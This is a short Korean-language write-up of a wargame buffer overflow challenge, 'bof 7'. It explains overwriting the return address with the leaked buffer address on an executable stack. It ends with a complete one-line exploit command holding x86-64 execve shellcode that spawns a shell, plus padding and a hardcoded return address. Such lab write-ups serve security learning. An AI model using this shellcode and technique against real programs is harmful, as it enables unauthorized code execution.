# bof 7

bof6 문제와 비슷한 메커니즘으로 풀면되지만 차이점이 2가지 있다.

1. main 함수의 인자를 통해 버퍼가 채워진다.
2. shellcode가 스택에 저장되어있지 않다.

다만 stack-execution ON이므로 buffer에 직접적으로 shellcode를 심은 뒤 sfp까지는 dummy로 채운다. 그리고 ret 주소는 buffer의 주소를 넣어주어 우리가 직접 심은 shellcode가 실행되도록 한다.

buffer의 주소는 printf가 출력해주므로 그것을 이용한다. 

따라서 터미널에 입력해야 하는 명령은 다음과 같다.

``` bash
$ ./bof7 `python -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+"a"*109+"\x70\xea\xff\xff\xff\x7f\x00\x00"'`
```